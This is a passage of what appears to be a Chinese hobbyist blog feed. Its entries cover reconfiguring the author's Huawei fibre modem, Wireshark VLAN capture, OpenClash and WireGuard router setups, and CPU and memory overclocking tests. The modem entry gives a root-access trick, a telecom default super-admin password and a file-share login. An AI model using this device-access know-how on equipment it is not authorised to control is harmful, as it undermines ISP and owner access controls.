title="image-20230809011600558"><img src="/fuck_chinamobile/image-20230809011324871.png" class="" title="image-20230809011324871"><h4 id="FullCone-NAT"><a href="#FullCone-NAT" class="headerlink" title="FullCone NAT"></a>FullCone NAT</h4><img src="/fuck_chinamobile/image-20230809011423339.png" class="" title="image-20230809011423339"><h4 id="和-K662d-正常-Mesh-组网"><a href="#和-K662d-正常-Mesh-组网" class="headerlink" title="和 K662d 正常 Mesh 组网"></a>和 K662d 正常 Mesh 组网</h4><img src="/fuck_chinamobile/image-20230811215907637.png" class="" title="image-20230811215907637"><img src="/fuck_chinamobile/image-20230811220213541.png" class="" title="image-20230811220213541"><p>这里我没有关闭 Wi-Fi覆盖业务(修改后，重启生效)，我觉得原帖说的可能是老版本系统有 BUG 导致的。</p><h2 id="碰到的一些问题"><a href="#碰到的一些问题" class="headerlink" title="碰到的一些问题"></a>碰到的一些问题</h2><h3 id="问题1：IPV6-禁止入站"><a href="#问题1：IPV6-禁止入站" class="headerlink" title="问题1：IPV6 禁止入站"></a>问题1：IPV6 禁止入站</h3><p>其实在电信界面是有关闭 IPV6 防火墙的设置的，不过在华为界面就没看到了。</p><h4 id="第一种方法-telnet-修改文件（不推荐）"><a href="#第一种方法-telnet-修改文件（不推荐）" class="headerlink" title="第一种方法  telnet 修改文件（不推荐）"></a>第一种方法  telnet 修改文件（不推荐）</h4><img src="/fuck_chinamobile/image-20230809012929409.png" class="" title="image-20230809012929409"><p>使用解密工具解密后，搜索 X_HW_IPv6FWDFireWallEnable</p><img src="/fuck_chinamobile/image-20230809013113964.png" class="" title="image-20230809013113964"><p>把 1 改成 0，保存加密导入回去重启即可。</p><p>注意如果提示 tftp: can’t open ‘hw_ctree.xml’: Permission denied</p><p>则需要获取 root 权限，步骤如下</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">touch /mnt/jffs2/Equip.sh       //开启root权限</span></span><span class="line"><span style="color: #abb2bf">reboot                                 //重启</span></span><span class="line"><span style="color: #abb2bf">继续你的上传操作</span></span><span class="line"><span style="color: #abb2bf">rm /mnt/jffs2/Equip.sh          //关闭root权限!</span></span><span class="line"><span style="color: #abb2bf">reboot                                 //重启</span></span></code></pre></div></div></figure><p><strong>我用这种方法修改文件之后 WiFi 消失，设置界面中 WiFi 设置一片空白</strong></p><h4 id="第二种方法-适用于华为公版界面，直接导出修改即可"><a href="#第二种方法-适用于华为公版界面，直接导出修改即可" class="headerlink" title="第二种方法 适用于华为公版界面，直接导出修改即可"></a>第二种方法 适用于华为公版界面，直接导出修改即可</h4><img src="/fuck_chinamobile/image-20230809022456582.png" class="" title="image-20230809022456582"><img src="/fuck_chinamobile/image-20230809022525180.png" class="" title="image-20230809022525180"><p>我用的第二种方法，改好之后上传还原即可。</p><img src="/fuck_chinamobile/image-20230809022700215.png" class="" title="image-20230809022700215"><p>测试OK</p><img src="/fuck_chinamobile/image-20230809023113678.png" class="" title="image-20230809023113678"><p>PT 正常，IPV4 甚至有入站连接。</p><img src="/fuck_chinamobile/image-20230809023306122.png" class="" title="image-20230809023306122"><h3 id="问题2：DHCP失效"><a href="#问题2：DHCP失效" class="headerlink" title="问题2：DHCP失效"></a>问题2：DHCP失效</h3><p>如果恢复出厂设置之后或者备份还原 hw_boardinfo 文件出现拿不到 IP 的情况，可以手动开关一下 DHCP 服务器，可以解决。</p><h3 id="一些小Tips"><a href="#一些小Tips" class="headerlink" title="一些小Tips"></a>一些小Tips</h3><p>1、华为界面恢复出厂设置之后，PON模式会变为原来的，但修改的 GPON SN 不会变，同时恢复出厂不掉的超级密码也会被替换成电信默认的nE7jA%5m</p><p>待补充…</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>用下来还是挺不错的，总花费不算人工费55+100，我家因为户型原因这俩也够全覆盖了。华为固件的 FullCone NAT 也挺好用，局端设备都能 NAT1，总之性价比拉满。唯一缺点是固件不自带限速功能，其他功能还是挺强大的。</p><h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><p><a href="https://www.right.com.cn/forum/thread-8147423-1-1.html">https://www.right.com.cn/forum/thread-8147423-1-1.html</a></p><p><a href="https://www.chinadsl.net/thread-168378-1-1.html">https://www.chinadsl.net/thread-168378-1-1.html</a></p><p><a href="https://www.chinadsl.net/forum.php?mod=viewthread&tid=168309&extra=">https://www.chinadsl.net/forum.php?mod=viewthread&amp;tid=168309&amp;extra=</a></p><p><a href="https://www.right.com.cn/forum/thread-4091764-1-1.html">https://www.right.com.cn/forum/thread-4091764-1-1.html</a></p><h3 id="所用到的工具："><a href="#所用到的工具：" class="headerlink" title="所用到的工具："></a>所用到的工具：</h3><p><a href="https://alist.irec.moe/@login">网盘链接</a></p><p>账号：ont</p><p>密码：ont12345</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;设备情况&quot;&gt;&lt;a href=&quot;#设备情况&quot; class=&quot;headerlink&quot; title=&quot;设备情况&quot;&gt;&lt;/a&gt;设备情况&lt;/h2&gt;&lt;p&gt;湖南电信EPON版本的 HS8145X6&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/</summary>
      
    
    
    
    <category term="硬件" scheme="https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"/>
    
    
    <category term="光猫" scheme="https://blog.irec.moe/tags/%E5%85%89%E7%8C%AB/"/>
    
  </entry>
  
  <entry>
    <title>在 RTL 网卡上启用 Wireshark VLAN 抓包功能</title>
    <link href="https://blog.irec.moe/wireshark_vlan_enable.html"/>
    <id>https://blog.irec.moe/wireshark_vlan_enable.html</id>
    <published>2023-07-21T12:00:00.000Z</published>
    <updated>2023-08-19T04:15:37.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="在-RTL-网卡上启用-Wireshark-VLAN-抓包功能"><a href="#在-RTL-网卡上启用-Wireshark-VLAN-抓包功能" class="headerlink" title="在 RTL 网卡上启用 Wireshark VLAN 抓包功能"></a>在 RTL 网卡上启用 Wireshark VLAN 抓包功能</h1><h2 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h2><p>网卡：Thinkbook 14+ 6800H 自带 RTL8168 网卡</p><p>驱动版本：10.65.421.2023</p><p>WireShark版本：v4.0.7-0-g0ad1823cc090</p><h2 id="1、查看驱动注册表位置"><a href="#1、查看驱动注册表位置" class="headerlink" title="1、查看驱动注册表位置"></a>1、查看驱动注册表位置</h2><p>详细信息 - 属性 -&gt; 驱动程序关键字，如下图。找到最后结尾那个数字，比如我这里是0001</p><img src="/wireshark_vlan_enable/image-20230721130249636.png" class="" title="image-20230721130249636"><h2 id="2、修改注册表"><a href="#2、修改注册表" class="headerlink" title="2、修改注册表"></a>2、修改注册表</h2><p>找到之后 Win + R 输入 regedit 打开注册表。</p><p>然后定位到</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class{4D36E972-E325-11CE-BFC1-08002bE10318}\0001</span></span></code></pre></div></div></figure><p>注意这里末尾的数字根据你上一步找到的修改相应的数值。</p><img src="/wireshark_vlan_enable/image-20230721132443649.png" class="" title="image-20230721132443649"><p>进去之后只需要把预先存在的 MonitorModeEnabled 的值改为1即可，其他都不用动，我实测成功！</p><img src="/wireshark_vlan_enable/image-20230721130857137.png" class="" title="image-20230721130857137"><h2 id="3、修改-Wireshark-设置"><a href="#3、修改-Wireshark-设置" class="headerlink" title="3、修改 Wireshark 设置"></a>3、修改 Wireshark 设置</h2><p>右击列标，选择首选项</p><img src="/wireshark_vlan_enable/image-20230721131328240.png" class="" title="image-20230721131328240"><p>点击右下角的+，输入标题，选择类型之后拖动到合适的位置即可。</p><img src="/wireshark_vlan_enable/image-20230721131635479.png" class="" title="image-20230721131635479"><h2 id="4、测试"><a href="#4、测试" class="headerlink" title="4、测试"></a>4、测试</h2><p>通常情况下接到交换机的 Trunk 口就能接收到绝大部分的 VLAN 包了（交换机上设置 ALLOW VLAN ALL）。</p><p>由于没有网管交换机，这是我通过路由器的 IPTV 功能来模拟的，路由器上设置了 IPTV 口，路由器会在 WAN 口上打上对应的标签发送出去，这样我就能从 WAN 口上接收到<strong>打上 VLAN 标签</strong>（路由器上 IPTV 口）的数据包了。</p><img src="/wireshark_vlan_enable/image-20230721130914753.png" class="" title="image-20230721130914753"><p>Enjoy！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;在-RTL-网卡上启用-Wireshark-VLAN-抓包功能&quot;&gt;&lt;a href=&quot;#在-RTL-网卡上启用-Wireshark-VLAN-抓包功能&quot; class=&quot;headerlink&quot; title=&quot;在 RTL 网卡上启用 Wireshark VLAN 抓包功</summary>
      
    
    
    
    <category term="网络" scheme="https://blog.irec.moe/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="WireShark" scheme="https://blog.irec.moe/tags/WireShark/"/>
    
    <category term="经验" scheme="https://blog.irec.moe/tags/%E7%BB%8F%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>在 OpenClash 代理环境下 Windows 提示无 Internet</title>
    <link href="https://blog.irec.moe/openclash_windows_nointernet.html"/>
    <id>https://blog.irec.moe/openclash_windows_nointernet.html</id>
    <published>2023-06-22T12:00:00.000Z</published>
    <updated>2023-08-19T04:15:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>在软路由上用了一段时间 OpenClash，由于我是自己写的规则，所以在很多地方都不完整，中途遇到多多少少的bug。</p><p>由于碰到这个无 Internet 的问题，导致某些微软服务登不上，有点烦人。所以折腾了一段时间，有了这样几种解决办法。</p><h2 id="第一种方法-让域名走代理"><a href="#第一种方法-让域名走代理" class="headerlink" title="第一种方法 - 让域名走代理"></a>第一种方法 - 让域名走代理</h2><p>在<a href="https://github.com/vernesong/OpenClash/issues/6#issuecomment-1490424197">这个地方</a>也有讨论下，我是这样解决的。</p><p>同样是 FAKE-IP 模式，今天为了这问题折腾一天，最后发现是因为 OpenClash 的 DNS 代理解析出的 IP ，我本地访问会直接被 RESET，而我用本地网络环境解析到的 DNS 却可以正常访问。<br>还碰到一个坑是某些代理商会屏蔽 <a href="http://www.msftconnecttest.com/">www.msftconnecttest.com</a> ，具体表现和上述一样。<br>最后我单独改了规则，让他走微软服务，然后微软服务再单独走不屏蔽的节点，完美解决。<br><a href="https://user-images.githubusercontent.com/19749321/228871491-bafa7edb-c276-4ce4-a150-d44683a6015f.png"><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://user-images.githubusercontent.com/19749321/228871491-bafa7edb-c276-4ce4-a150-d44683a6015f.png" alt="image" data-caption="image" loading="lazy"></a><br>其实还有其他解决办法，比如说让这个域名单独走本地DNS解析，我觉得这样<del>简单省事</del>就懒得弄了。<br>实测并不是IP段的问题，我还是默认的198.18.0.1&#x2F;16段。<br><a href="https://user-images.githubusercontent.com/19749321/228872945-7c10bf86-cb7b-4d66-acbc-54787d26666c.png"><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://user-images.githubusercontent.com/19749321/228872945-7c10bf86-cb7b-4d66-acbc-54787d26666c.png" alt="image" data-caption="image" loading="lazy"></a><br><a href="https://user-images.githubusercontent.com/19749321/228873469-ed5acddb-25dd-4b75-a9de-6af3de2f0e2b.png"><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://user-images.githubusercontent.com/19749321/228873469-ed5acddb-25dd-4b75-a9de-6af3de2f0e2b.png" alt="image" data-caption="image" loading="lazy"></a></p><h2 id="另外一种方法-过滤域名请求"><a href="#另外一种方法-过滤域名请求" class="headerlink" title="另外一种方法 - 过滤域名请求"></a>另外一种方法 - 过滤域名请求</h2><p>这段配置是我从其他地方抄过来的，实测可用，记得把前面一种方法提到的 <a href="http://www.msftconnecttest.com/">www.msftconnecttest.com</a> 改一下规则，让他不走代理即可。这种方法比上面的方法更简单省事。</p><figure class="shiki yaml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">dns</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E06C75">fake-ip-filter</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">    - </span><span style="color: #98C379">&#39;*.lan&#39;</span></span><span class="line"><span style="color: #ABB2BF">    - </span><span style="color: #98C379">localhost.ptlogin2.qq.com</span></span><span class="line"><span style="color: #ABB2BF">    - </span><span style="color: #98C379">&#39;+.srv.nintendo.net&#39;</span></span><span class="line"><span style="color: #ABB2BF">    - </span><span style="color: #98C379">&#39;+.stun.playstation.net&#39;</span></span><span class="line"><span style="color: #ABB2BF">    - </span><span style="color: #98C379">&#39;+.msftconnecttest.com&#39;</span></span><span class="line"><span style="color: #ABB2BF">    - </span><span style="color: #98C379">&#39;+.msftncsi.com&#39;</span></span><span class="line"><span style="color: #ABB2BF">    - </span><span style="color: #98C379">&#39;+.xboxlive.com&#39;</span></span><span class="line"><span style="color: #ABB2BF">    - </span><span style="color: #98C379">&#39;msftconnecttest.com&#39;</span></span><span class="line"><span style="color: #ABB2BF">    - </span><span style="color: #98C379">&#39;xbox.*.microsoft.com&#39;</span></span></code></pre></div></div></figure><p>这一段的主要作用就是让 OpenClash 不解析在列表内的域名，直接返回源 IP 地址，这样获取到的 IP 就不会是 198.18.0.0&#x2F;16了。</p><h2 id="Enjoy！"><a href="#Enjoy！" class="headerlink" title="Enjoy！"></a>Enjoy！</h2><img src="/openclash_windows_nointernet/image-20230622152603116.png" class="" title="image-20230622152603116">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在软路由上用了一段时间 OpenClash，由于我是自己写的规则，所以在很多地方都不完整，中途遇到多多少少的bug。&lt;/p&gt;
&lt;p&gt;由于碰到这个无 Internet 的问题，导致某些微软服务登不上，有点烦人。所以折腾了一段时间，有了这样几种解决办法。&lt;/p&gt;
&lt;h2 id=</summary>
      
    
    
    
    <category term="网络" scheme="https://blog.irec.moe/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="OpenClash" scheme="https://blog.irec.moe/tags/OpenClash/"/>
    
  </entry>
  
  <entry>
    <title>在 OpenWrt 下使用 WireGuard 实现全局代理上网</title>
    <link href="https://blog.irec.moe/openwrt_with_wireguard_proxy.html"/>
    <id>https://blog.irec.moe/openwrt_with_wireguard_proxy.html</id>
    <published>2023-06-22T12:00:00.000Z</published>
    <updated>2023-08-19T04:16:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="在-OpenWrt-下使用-WireGuard-实现全局代理上网"><a href="#在-OpenWrt-下使用-WireGuard-实现全局代理上网" class="headerlink" title="在 OpenWrt 下使用 WireGuard 实现全局代理上网"></a>在 OpenWrt 下使用 WireGuard 实现全局代理上网</h1><h2 id="设备情况"><a href="#设备情况" class="headerlink" title="设备情况"></a>设备情况</h2><p>设备型号：360 T7</p><p>固件版本号：ImmortalWrt 18.06-5.4-SNAPSHOT r11814-ef0c86bdb0 &#x2F; LuCI branch (git-22.323.17670-f9380b5)</p><img src="/openwrt_with_wireguard_proxy/image-20230622160616094.png" class="" title="image-20230622160616094"><p><strong>网络架构图如下</strong></p><img src="/openwrt_with_wireguard_proxy/image-20230812051639947.png" class="" title="image-20230812051639947"><h2 id="网络设置"><a href="#网络设置" class="headerlink" title="网络设置"></a>网络设置</h2><p>新建 WG 接口，修改协议为 WireGuard VPN</p><p>一般配置里填好<strong>私钥</strong>（可以自行生成），<strong>IP地址</strong>（对端的允许的IP）</p><p>Peers 里添加一个新的。</p><p>然后填写对端的<strong>公钥</strong>，<strong>允许的IP</strong>话，看情况填写。</p><ul><li>如果只需要走部分网段的话（打通内网），填写对应的网段即可（CIDR格式），例如192.168.88.0&#x2F;24, 10.22.33.128&#x2F;25。点加号可以添加多条。</li><li>如果需要全局代理的话，填写0.0.0.0&#x2F;0（默认路由）即可</li></ul><p><strong>路由允许的 IP</strong> 打钩，这一条是自动添加路由表的作用。</p><p><strong>端点主机和端点端口</strong>填写对端的IP地址和端口即可。</p><p><strong>持续 Keep-Alive</strong> 看情况填写，我使用的是默认值0。</p><p>填写好是这样的：</p><img src="/openwrt_with_wireguard_proxy/image-20230622154615466.png" class="" title="image-20230622154615466"><img src="/openwrt_with_wireguard_proxy/image-20230622154638126.png" class="" title="image-20230622154638126"><p>到这一步，如果只需要走部分网段的设置已经接近尾声了，把新建的 WG 接口加入到和 LAN 相同的防火墙区域，即可打通。或者新建一个新区域，配置规则也行，保存应用之后重连一下端口，就可以在 状态 - WireGuard 状态 看到链接信息了，有正常收发流量即为正常。</p><img src="/openwrt_with_wireguard_proxy/image-20230622154543710.png" class="" title="image-20230622154543710"><h2 id="全局代理设置"><a href="#全局代理设置" class="headerlink" title="全局代理设置"></a>全局代理设置</h2><p>对于这个在网上相关的资料非常少<del>（也许是我想实现的效果比较扭曲）</del>，我到最后发现会自动给我添加 WAN 口的默认路由，导致走不下去，手动添加配置删除路由还是不太稳定，所以放弃。最近有了新发现，是 MWAN 搞的鬼。</p><p>现在开始配置教程。</p><h3 id="防火墙设置"><a href="#防火墙设置" class="headerlink" title="防火墙设置"></a>防火墙设置</h3><p>在防火墙区域<strong>新建一个 VPN 区域</strong>，把 <strong>IP 动态伪装</strong>打开（相当于在主路由那边是通过这台路由器 NAT 之后通信），再把 WG 接口添加到 VPN 区域。</p><p>修改 VPN 区域的设置：</p><p>​<strong>允许转发到目标区域</strong>：WAN 区域打钩</p><p>​<strong>允许来自源区域的转发</strong>： LAN 区域打钩</p><p>修改 WAN 区域的设置：</p><p>​<strong>允许转发到目标区域</strong>：空</p><p>​<strong>允许来自源区域的转发：</strong>VPN 区域打钩</p><p>修改 LAN 区域的设置：</p><p>​<strong>允许转发到目标区域</strong>：VPN 区域打钩</p><p>​<strong>允许来自源区域的转发：</strong>空</p><p>修改好应该是这样的</p><h4 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h4><img src="/openwrt_with_wireguard_proxy/image-20230622155412335.png" class="" title="image-20230622155412335"><h5 id="LAN"><a href="#LAN" class="headerlink" title="LAN"></a><strong>LAN</strong></h5><img src="/openwrt_with_wireguard_proxy/image-20230622155446824.png" class="" title="image-20230622155446824"><h5 id="WAN"><a href="#WAN" class="headerlink" title="WAN"></a><strong>WAN</strong></h5><img src="/openwrt_with_wireguard_proxy/image-20230622155505659.png" class="" title="image-20230622155505659"><h5 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a><strong>VPN</strong></h5><img src="/openwrt_with_wireguard_proxy/image-20230622155518649.png" class="" title="image-20230622155518649"><p>到此防火墙设置结束。</p><h3 id="接口设置"><a href="#接口设置" class="headerlink" title="接口设置"></a>接口设置</h3><p>WAN接口 -&gt; 高级设置 -&gt; 使用默认网关 <strong>去掉对钩</strong></p><p>LAN接口 -&gt; 基本设置 -&gt; 使用自定义的 DNS 服务器 -&gt; 填写 WG 那边的网关，或者公共 DNS</p><h3 id="路由设置"><a href="#路由设置" class="headerlink" title="路由设置"></a>路由设置</h3><p>网络 -&gt; 静态路由 -&gt; 静态 IPv4 路由</p><p><strong>接口</strong>选择 WAN ，<strong>对象</strong>填写对端 WG 的 IP 地址，<strong>IPv4 子网掩码</strong>32位，<strong>IPv4 网关</strong>填写你 WAN 口上级路由器的网关地址，其他保持默认即可。</p><p>网络 -&gt; 静态路由 -&gt; 静态 IPv4 路由</p><p><strong>网络 -&gt; 负载均衡（MWAN） -&gt; 禁用所有 MWAN 接口</strong></p><p>就是因为这个原因，所以他才会自动给我加路由表，明明我取消了使用默认网关，并且没有添加其他的路由项，还是会给我加默认路由，情况如下图。</p><img src="/openwrt_with_wireguard_proxy/image-20230622160227228.png" class="" title="image-20230622160227228"><p><strong>关闭 MWAN 后</strong></p><img src="/openwrt_with_wireguard_proxy/image-20230622160248957.png" class="" title="image-20230622160248957"><h2 id="测试联通性"><a href="#测试联通性" class="headerlink" title="测试联通性"></a>测试联通性</h2><img src="/openwrt_with_wireguard_proxy/image-20230622164300520.png" class="" title="image-20230622164300520"><img src="/openwrt_with_wireguard_proxy/image-20230622164419608.png" class="" title="image-20230622164419608"><p>Enjoy！</p><h2 id="更换固件后测试"><a href="#更换固件后测试" class="headerlink" title="更换固件后测试"></a>更换固件后测试</h2><p>固件版本号：QWRT R23.6.1 &#x2F; LuCI Master (git-23.141.16773-28dd4b3)</p><img src="/openwrt_with_wireguard_proxy/image-20230622161222503.png" class="" title="image-20230622161222503"><p>这个固件防火墙区域都不用配置，WAN也不用取消默认网关，默认即可上网（自动给添加了路由）。</p><p><strong>默认路由表</strong></p><img src="/openwrt_with_wireguard_proxy/image-20230622163508283.png" class="" title="image-20230622163508283"><p><strong>配置好 WG 后的路由表</strong></p><img src="/openwrt_with_wireguard_proxy/image-20230622163635986.png" class="" title="image-20230622163635986"><p>大雕NB！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;在-OpenWrt-下使用-WireGuard-实现全局代理上网&quot;&gt;&lt;a href=&quot;#在-OpenWrt-下使用-WireGuard-实现全局代理上网&quot; class=&quot;headerlink&quot; title=&quot;在 OpenWrt 下使用 WireGuard 实现全局</summary>
      
    
    
    
    <category term="网络" scheme="https://blog.irec.moe/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="OpenWrt" scheme="https://blog.irec.moe/tags/OpenWrt/"/>
    
    <category term="WireGuard" scheme="https://blog.irec.moe/tags/WireGuard/"/>
    
  </entry>
  
  <entry>
    <title>自用 PC 机的折腾记录</title>
    <link href="https://blog.irec.moe/my_pc.html"/>
    <id>https://blog.irec.moe/my_pc.html</id>
    <published>2023-06-18T04:00:00.000Z</published>
    <updated>2023-12-20T06:48:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="配置如下"><a href="#配置如下" class="headerlink" title="配置如下"></a>配置如下</h1><ul><li>CPU: Intel Core i7-13700K<ul><li>Base Clock <ul><li>P Core <a href="mailto:&#53;&#x2e;&#51;&#71;&#72;&#x7a;&#x40;&#49;&#x2e;&#51;&#x34;&#86;">&#53;&#x2e;&#51;&#71;&#72;&#x7a;&#x40;&#49;&#x2e;&#51;&#x34;&#86;</a></li><li>E Core <a href="mailto:&#x34;&#x2e;&#x32;&#71;&#72;&#122;&#64;&#x31;&#x2e;&#51;&#52;&#x56;">&#x34;&#x2e;&#x32;&#71;&#72;&#122;&#64;&#x31;&#x2e;&#51;&#52;&#x56;</a></li></ul></li><li>Current:<ul><li>关闭 HT + VRM LLC Mode 8 + CPU LiteLoad Mode 1</li></ul></li></ul></li><li>CPU Cooler: VALKYRIE C360-RGB</li><li>CPU Thermal Paste: Shinetsu X-23-7921-5</li><li>RAM: OLOy 战鹰白金特别版 RGB 3600MHz 16GB x2</li><li>Motherboard: MSI PRO-Z690-A-WIFI-DDR4<ul><li>BIOS: 7D25v1C</li></ul></li><li>GPU: 盈通 RTX3080 10G 花嫁 0.8V@1710MHz</li><li>Case: DIY Rack</li><li>OS: Windows 10</li></ul><h1 id="BIOS常规设置"><a href="#BIOS常规设置" class="headerlink" title="BIOS常规设置"></a>BIOS常规设置</h1><p><strong>OC -&gt; Advanced CPU Configuration</strong></p><p>BCLK 100MHz Lock On 开</p><p>HT 关</p><p>CPU Over Temp Protection 110°C</p><p>TVB 相关全关</p><p>IA CEP Support 关</p><p>功耗相关设置在设置散热器的时候BIOS自动帮你调整了，这里就不手动调了。</p><h1 id="GPU降压"><a href="#GPU降压" class="headerlink" title="GPU降压"></a>GPU降压</h1><p>照泥潭大佬的<a href="https://bbs.nga.cn/read.php?tid=24280626">教程</a>，摸出下面的表，照着配置即可，最终结果 <strong>0.8V@1710MHz</strong>。</p><table><thead><tr><th>Voltage</th><th>Freq</th><th>Result</th></tr></thead><tbody><tr><td>0.8</td><td>1830</td><td>X</td></tr><tr><td></td><td>1815</td><td>X</td></tr><tr><td></td><td>1800</td><td>X</td></tr><tr><td></td><td>1785</td><td>X</td></tr><tr><td></td><td>1740</td><td>X</td></tr><tr><td></td><td>1710</td><td>CURRENT</td></tr><tr><td></td><td></td><td></td></tr><tr><td>0.825</td><td>1875</td><td>X</td></tr><tr><td></td><td>1830</td><td>X</td></tr><tr><td></td><td>1800</td><td>X 3DM 不过</td></tr></tbody></table><h1 id="IMC"><a href="#IMC" class="headerlink" title="IMC"></a>IMC</h1><p>首先摸IMC体质，SA 电压1.4起摸，内存用 XMP 2 4400MHz 18-26-26-46 @ 1.55V。</p><p>烧机工具使用 yc 0 1 8 16。</p><table><thead><tr><th>Freq</th><th>SA</th><th>result</th><th>Passed</th></tr></thead><tbody><tr><td><strong>4400MHz</strong></td><td>1.45</td><td>不开机</td><td></td></tr><tr><td><strong>4300MHz</strong></td><td>1.45</td><td>进系统 -&gt; yc 秒重启</td><td></td></tr><tr><td><strong>4266MHz</strong></td><td>1.45</td><td>进系统 -&gt; yc 38s报错</td><td></td></tr><tr><td>4266MHz</td><td>1.40</td><td>进系统 -&gt; yc 秒报错 -&gt; 蓝屏</td><td></td></tr><tr><td>4266MHz</td><td>1.50</td><td>进系统 -&gt; yc 秒报错</td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td><strong>4200MHz</strong></td><td>1.40</td><td>进系统 -&gt; yc 15it Passed</td><td>YES</td></tr><tr><td><strong>4200MHz</strong></td><td><strong>1.37</strong></td><td><strong>进系统 -&gt; yc 20it Passed</strong></td><td><strong>YES</strong></td></tr><tr><td>4200MHz</td><td>1.36</td><td>进系统 -&gt; yc 2it 报错</td><td></td></tr><tr><td>4200MHz</td><td>1.35</td><td>进系统 -&gt; yc 1it 报错</td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td><strong>4133MHz</strong></td><td>1.30</td><td>进系统 -&gt; yc 5it Passed</td><td>YES</td></tr><tr><td>4133MHz</td><td>1.275</td><td>进系统 -&gt; yc 5it Passed</td><td>YES</td></tr><tr><td><strong>4133MHz</strong></td><td><strong>1.26</strong></td><td><strong>进系统 -&gt; yc 15it Passed</strong></td><td><strong>YES</strong></td></tr><tr><td>4133MHz</td><td>1.255</td><td>进系统 -&gt; yc 5it Passed</td><td></td></tr><tr><td>4133MHz</td><td>1.25</td><td>进系统 -&gt; yc 1min 报错</td><td></td></tr><tr><td>4133MHz</td><td>1.20</td><td>进系统 -&gt; 蓝屏</td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td><strong>4100MHz</strong></td><td><strong>1.24</strong></td><td><strong>进系统 -&gt; yc 15it Passed</strong></td><td><strong>YES</strong></td></tr><tr><td>4100MHz</td><td>1.23</td><td>进系统 -&gt; yc 7it 报错</td><td></td></tr><tr><td>4100MHz</td><td>1.22</td><td>进系统 -&gt; yc 2min 报错</td><td></td></tr><tr><td>4100MHz</td><td>1.20</td><td>进系统 -&gt; yc 秒报错</td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td><strong>4000MHz</strong></td><td><strong>1.15</strong></td><td><strong>进系统 -&gt; yc 60it Passed</strong></td><td><strong>YES</strong></td></tr><tr><td>4000MHz</td><td>1.14</td><td>进系统 -&gt; yc 5it 报错</td><td></td></tr><tr><td>4000MHz</td><td>1.12</td><td>进系统 -&gt; yc 秒报错</td><td></td></tr><tr><td>4000MHz</td><td>1.10</td><td>进系统 -&gt; 蓝屏</td><td></td></tr></tbody></table><p>实测开关 HT 对 IMC 体质无影响，该不开机的还是不开机</p><table><thead><tr><th>Freq</th><th>SA Voltage</th><th>result</th><th>Passed</th></tr></thead><tbody><tr><td>4400MHz</td><td>1.45</td><td>不开机</td><td></td></tr><tr><td>4300MHz</td><td>1.45</td><td>进系统 -&gt; yc 秒报错</td><td></td></tr><tr><td>4266MHz</td><td>1.45</td><td>进系统 -&gt; yc 20s报错</td><td></td></tr></tbody></table><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>通过上面的测试结果我们可以找到这几组数据</p><table><thead><tr><th>Freq</th><th>SA Voltage</th><th>result</th><th>Passed</th></tr></thead><tbody><tr><td>4200MHz</td><td>1.37</td><td>进系统 -&gt; yc 20it Passed</td><td>YES</td></tr><tr><td>4133MHz</td><td>1.26</td><td>进系统 -&gt; yc 15it Passed</td><td>YES</td></tr><tr><td>4100MHz</td><td>1.24</td><td>进系统 -&gt; yc 15it Passed</td><td>YES</td></tr><tr><td>4000MHz</td><td>1.15</td><td>进系统 -&gt; yc 60it Passed</td><td>YES</td></tr></tbody></table><p>最终我选择了<a href="mailto:&#52;&#49;&#x33;&#51;&#77;&#x48;&#x7a;&#64;&#x31;&#x2e;&#x32;&#x38;&#x56;">&#52;&#49;&#x33;&#51;&#77;&#x48;&#x7a;&#64;&#x31;&#x2e;&#x32;&#x38;&#x56;</a>，电压按习惯多给0.02防止缩肛不稳定。为什么没选择4200Mhz是因为我觉得0.1V的电压提升67MHz不太值，仅此而已。</p><hr><h1 id="CPU超频"><a href="#CPU超频" class="headerlink" title="CPU超频"></a>CPU超频</h1><p>首先是上文调整好IMC后的测试结果。</p><p>CPU-Z 单核876.5分，多核10646.1分</p><p>R23 多核25205分。</p><p>AIDA64 内存测试结果：</p><p>AIDA64 